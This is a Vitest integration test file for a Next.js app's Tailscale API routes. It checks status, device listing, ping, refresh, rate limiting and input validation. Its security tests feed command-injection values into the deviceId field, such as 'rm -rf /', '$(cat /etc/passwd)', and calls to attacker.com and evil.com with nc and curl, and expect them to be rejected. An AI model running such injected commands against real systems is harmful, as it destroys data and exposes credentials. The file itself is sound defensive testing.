/**
 * Integration tests for Tailscale API Routes
 *
 * Tests all Tailscale API endpoints:
 * - GET /api/workspace/tailscale/status
 * - GET /api/workspace/tailscale/devices
 * - POST /api/workspace/tailscale/ping
 * - POST /api/workspace/tailscale/refresh
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { NextRequest } from 'next/server';

// Mock the TailscaleManager module
vi.mock('@/lib/workspace/tailscale', async () => {
  const actual = await vi.importActual('@/lib/workspace/tailscale');
  return {
    ...actual,
    getTailscaleManager: vi.fn(),
  };
});

// Mock the logger to prevent console noise
vi.mock('@/lib/logger', () => ({
  createLogger: () => ({
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  }),
}));

import { getTailscaleManager, __resetRateLimiterForTesting } from '@/lib/workspace/tailscale';
import type { TailscaleStatus, TailscaleDevice, TailscalePingResult } from '@/lib/workspace/tailscale';

// Import route handlers
import { GET as statusHandler } from '@/app/api/workspace/tailscale/status/route';
import { GET as devicesHandler } from '@/app/api/workspace/tailscale/devices/route';
import { POST as pingHandler } from '@/app/api/workspace/tailscale/ping/route';
import { POST as refreshHandler } from '@/app/api/workspace/tailscale/refresh/route';

// ============================================================================
// Test Fixtures
// ============================================================================

const mockDevice: TailscaleDevice = {
  id: 'node123',
  hostname: 'webserver-prod',
  dnsName: 'webserver-prod.tail1234.ts.net',
  tailscaleIP: '100.64.0.1',
  os: 'linux',
  online: true,
  lastSeen: new Date('2026-03-01T10:00:00Z'),
  tags: ['tag:server'],
  sshEnabled: true,
  user: '12345',
  isSelf: false,
};

const mockOfflineDevice: TailscaleDevice = {
  ...mockDevice,
  id: 'node456',
  hostname: 'offline-device',
  dnsName: 'offline-device.tail1234.ts.net',
  tailscaleIP: '100.64.0.2',
  online: false,
  lastSeen: new Date('2026-02-28T10:00:00Z'),
};

const mockSelfDevice: TailscaleDevice = {
  ...mockDevice,
  id: 'self123',
  hostname: 'this-device',
  dnsName: 'this-device.tail1234.ts.net',
  tailscaleIP: '100.64.0.100',
  isSelf: true,
};

const mockStatusConnected: TailscaleStatus = {
  installed: true,
  loggedIn: true,
  connected: true,
  tailnetName: 'tail1234.ts.net',
  version: '1.50.0',
  selfDevice: mockSelfDevice,
  devices: [mockDevice, mockOfflineDevice, mockSelfDevice],
};

const mockStatusNotInstalled: TailscaleStatus = {
  installed: false,
  loggedIn: false,
  connected: false,
  tailnetName: '',
  version: '',
  selfDevice: null,
  devices: [],
};

const mockStatusDisconnected: TailscaleStatus = {
  installed: true,
  loggedIn: false,
  connected: false,
  tailnetName: '',
  version: '1.50.0',
  selfDevice: null,
  devices: [],
};

// ============================================================================
// Helper Functions
// ============================================================================

function createMockRequest(options: {
  method?: string;
  url?: string;
  body?: unknown;
  headers?: Record<string, string>;
}): NextRequest {
  const { method = 'GET', url = 'http://localhost:3000/api/workspace/tailscale/status', body, headers = {} } = options;

  const request = new NextRequest(url, {
    method,
    headers: {
      'Content-Type': 'application/json',
      ...headers,
    },
    body: body ? JSON.stringify(body) : undefined,
  });

  return request;
}

function createMockManager(overrides: Partial<{
  getStatus: () => Promise<TailscaleStatus>;
  listDevices: () => Promise<TailscaleDevice[]>;
  getDeviceById: (id: string) => Promise<TailscaleDevice | null>;
  ping: (device: TailscaleDevice) => Promise<TailscalePingResult>;
  refreshDevices: () => Promise<void>;
}> = {}) {
  return {
    getStatus: vi.fn().mockResolvedValue(mockStatusConnected),
    listDevices: vi.fn().mockResolvedValue([mockDevice, mockOfflineDevice]),
    getDeviceById: vi.fn().mockResolvedValue(mockDevice),
    ping: vi.fn().mockResolvedValue({ latency: 10, via: 'direct' as const }),
    refreshDevices: vi.fn().mockResolvedValue(undefined),
    ...overrides,
  };
}

// ============================================================================
// Tests: /api/workspace/tailscale/status
// ============================================================================

describe('/api/workspace/tailscale/status', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    __resetRateLimiterForTesting();
  });

  it('should return connected status when Tailscale is running', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({ url: 'http://localhost:3000/api/workspace/tailscale/status' });
    const response = await statusHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.installed).toBe(true);
    expect(data.connected).toBe(true);
    expect(data.tailnetName).toBe('tail1234.ts.net');
    expect(data.deviceCount).toBe(3);
    expect(data.selfDevice).toBeDefined();
    expect(data.selfDevice.hostname).toBe('this-device');
  });

  it('should return not installed status', async () => {
    const mockManager = createMockManager({
      getStatus: vi.fn().mockResolvedValue(mockStatusNotInstalled),
    });
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({ url: 'http://localhost:3000/api/workspace/tailscale/status' });
    const response = await statusHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.installed).toBe(false);
    expect(data.connected).toBe(false);
    expect(data.selfDevice).toBeNull();
    expect(data.deviceCount).toBe(0);
  });

  it('should include cache headers', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({ url: 'http://localhost:3000/api/workspace/tailscale/status' });
    const response = await statusHandler(request);

    expect(response.headers.get('Cache-Control')).toBe('private, max-age=10');
  });

  it('should handle errors gracefully', async () => {
    const mockManager = createMockManager({
      getStatus: vi.fn().mockRejectedValue(new Error('CLI timeout')),
    });
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({ url: 'http://localhost:3000/api/workspace/tailscale/status' });
    const response = await statusHandler(request);
    const data = await response.json();

    expect(response.status).toBe(500);
    expect(data.error).toBe('CLI timeout');
  });
});

// ============================================================================
// Tests: /api/workspace/tailscale/devices
// ============================================================================

describe('/api/workspace/tailscale/devices', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    __resetRateLimiterForTesting();
  });

  it('should return all devices', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({ url: 'http://localhost:3000/api/workspace/tailscale/devices' });
    const response = await devicesHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.devices).toHaveLength(2);
    expect(data.count).toBe(2);
    // Online devices should be first
    expect(data.devices[0].hostname).toBe('webserver-prod');
    expect(data.devices[0].online).toBe(true);
  });

  it('should filter by online=true', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      url: 'http://localhost:3000/api/workspace/tailscale/devices?online=true',
    });
    const response = await devicesHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.devices).toHaveLength(1);
    expect(data.devices[0].hostname).toBe('webserver-prod');
    expect(data.filters.onlineOnly).toBe(true);
  });

  it('should filter by hostname', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    // Use a more specific filter that only matches one device
    const request = createMockRequest({
      url: 'http://localhost:3000/api/workspace/tailscale/devices?hostname=webserver-prod',
    });
    const response = await devicesHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.devices).toHaveLength(1);
    expect(data.devices[0].hostname).toBe('webserver-prod');
    expect(data.filters.hostname).toBe('webserver-prod');
  });

  it('should return ISO date strings', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({ url: 'http://localhost:3000/api/workspace/tailscale/devices' });
    const response = await devicesHandler(request);
    const data = await response.json();

    expect(data.devices[0].lastSeen).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });
});

// ============================================================================
// Tests: /api/workspace/tailscale/ping
// ============================================================================

describe('/api/workspace/tailscale/ping', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    __resetRateLimiterForTesting();
  });

  it('should ping a device successfully', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: { deviceId: 'node123' },
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.deviceId).toBe('node123');
    expect(data.hostname).toBe('webserver-prod');
    expect(data.latency).toBe(10);
    expect(data.via).toBe('direct');
  });

  it('should return 400 for missing deviceId', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: {},
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(400);
    expect(data.error).toContain('deviceId is required');
  });

  it('should return 404 for unknown device', async () => {
    const mockManager = createMockManager({
      getDeviceById: vi.fn().mockResolvedValue(null),
    });
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: { deviceId: 'unknown' },
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(404);
    expect(data.code).toBe('DEVICE_NOT_FOUND');
  });

  it('should return 503 for offline device', async () => {
    const mockManager = createMockManager({
      getDeviceById: vi.fn().mockResolvedValue(mockOfflineDevice),
    });
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: { deviceId: 'node456' },
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(503);
    expect(data.code).toBe('TAILSCALE_DEVICE_OFFLINE');
    expect(data.recoverable).toBe(true);
  });

  it('should return relay connection type', async () => {
    const mockManager = createMockManager({
      ping: vi.fn().mockResolvedValue({ latency: 150, via: 'relay' as const }),
    });
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: { deviceId: 'node123' },
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.via).toBe('relay');
    expect(data.latency).toBe(150);
  });
});

// ============================================================================
// Tests: /api/workspace/tailscale/refresh
// ============================================================================

describe('/api/workspace/tailscale/refresh', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    __resetRateLimiterForTesting();
  });

  it('should refresh devices successfully', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/refresh',
    });
    const response = await refreshHandler(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.success).toBe(true);
    expect(data.deviceCount).toBe(3);
    expect(mockManager.refreshDevices).toHaveBeenCalled();
  });

  it('should return device summary', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/refresh',
    });
    const response = await refreshHandler(request);
    const data = await response.json();

    expect(data.devices).toBeDefined();
    expect(Array.isArray(data.devices)).toBe(true);
    expect(data.devices[0]).toHaveProperty('id');
    expect(data.devices[0]).toHaveProperty('hostname');
    expect(data.devices[0]).toHaveProperty('online');
  });

  it('should handle refresh errors', async () => {
    const mockManager = createMockManager({
      refreshDevices: vi.fn().mockRejectedValue(new Error('Network error')),
    });
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/refresh',
    });
    const response = await refreshHandler(request);
    const data = await response.json();

    expect(response.status).toBe(500);
    expect(data.error).toBe('Network error');
  });
});

// ============================================================================
// Tests: Security
// ============================================================================

describe('Security', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    __resetRateLimiterForTesting();
  });

  it('should reject deviceId with shell metacharacters', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: { deviceId: 'node123; rm -rf /' },
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(400);
    expect(data.code).toBe('INVALID_REQUEST');
  });

  it('should reject extremely long deviceId', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      method: 'POST',
      url: 'http://localhost:3000/api/workspace/tailscale/ping',
      body: { deviceId: 'a'.repeat(100) },
    });
    const response = await pingHandler(request);
    const data = await response.json();

    expect(response.status).toBe(400);
    expect(data.error).toContain('Invalid deviceId format');
  });

  it('should reject deviceId with special characters', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const maliciousIds = [
      'node`whoami`',
      'node$(cat /etc/passwd)',
      'node | nc attacker.com',
      'node && curl evil.com',
      'node\n/etc/passwd',
    ];

    for (const deviceId of maliciousIds) {
      const request = createMockRequest({
        method: 'POST',
        url: 'http://localhost:3000/api/workspace/tailscale/ping',
        body: { deviceId },
      });
      const response = await pingHandler(request);
      expect(response.status).toBe(400);
    }
  });

  it('should accept valid deviceId formats', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const validIds = ['node123', 'abc-def-123', 'myDevice_01', 'n123456789'];

    for (const deviceId of validIds) {
      __resetRateLimiterForTesting();
      const request = createMockRequest({
        method: 'POST',
        url: 'http://localhost:3000/api/workspace/tailscale/ping',
        body: { deviceId },
      });
      const response = await pingHandler(request);
      // These should not be rejected for format (may be 404 if not found)
      expect(response.status).not.toBe(400);
    }
  });
});

// ============================================================================
// Tests: Rate Limiting
// ============================================================================

describe('Rate Limiting', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    __resetRateLimiterForTesting();
  });

  it('should include rate limit headers in response', async () => {
    const mockManager = createMockManager();
    vi.mocked(getTailscaleManager).mockReturnValue(mockManager as any);

    const request = createMockRequest({
      url: 'http://localhost:3000/api/workspace/tailscale/status',
      headers: { 'x-forwarded-for': '192.168.1.100' },
    });
    const response = await statusHandler(request);

    expect(response.headers.get('X-RateLimit-Limit')).toBeDefined();
    expect(response.headers.get('X-RateLimit-Remaining')).toBeDefined();
  });
});
